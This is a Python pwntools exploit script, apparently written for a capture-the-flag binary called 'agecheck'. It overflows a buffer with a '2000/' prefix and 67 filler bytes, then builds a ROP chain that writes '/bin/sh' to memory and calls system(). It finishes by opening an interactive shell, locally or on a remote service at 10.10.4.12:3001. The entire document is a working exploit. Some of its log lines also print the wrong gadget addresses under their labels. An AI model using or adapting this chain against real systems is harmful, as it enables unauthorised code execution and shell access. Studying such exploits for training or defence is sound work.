#!/usr/bin/env python3

from pwn import ELF, process, ROP, remote, gdb, cyclic, cyclic_find, log, p64, u64
from pwnlib.rop.rop import Gadget
LOCAL_BIN = "./agecheck"
LOCAL = True
GDB = False

if LOCAL:
    P = process(LOCAL_BIN)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
    if GDB:
        gdb.attach(P.pid, """
b *(main+113)
display/i $pc
c
""")
else:
    P = remote('10.10.4.12',3001)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
	
BIN = ELF(LOCAL_BIN)
SYSTEM = BIN.sym["system"]
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]
POP_RAX = (ROP_LOADED.find_gadget(['pop rax', 'ret']))[0]
POP_RDX = (ROP_LOADED.find_gadget(['pop rdx', 'ret']))[0]
RET = (ROP_LOADED.find_gadget(['ret']))[0]
MOV_RAX_RDX = 0x465bcd # manually looked with ropper
RW_ADDR = 0x4aa000

def generate_payload_aligned(rop):
    payload1 = rop
    if (len(payload1) % 16) == 0:
        return payload1
    else:
        payload2 = p64(RET) + rop
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1

log.info("System: " + hex(SYSTEM))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("pop rax; ret  gadget: " + hex(POP_RDI))
log.info("pop rdx; ret  gadget: " + hex(POP_RDI))

rip_offset = 67
payload = p64(POP_RAX)+p64(RW_ADDR)+p64(POP_RDX)+(b"/bin/sh\x00")+p64(MOV_RAX_RDX)+p64(POP_RDI)+p64(RW_ADDR)+p64(SYSTEM)
payload = b"2000/"+b"A"*rip_offset+generate_payload_aligned(payload)

print(P.clean())
P.sendline(payload)
P.interactive()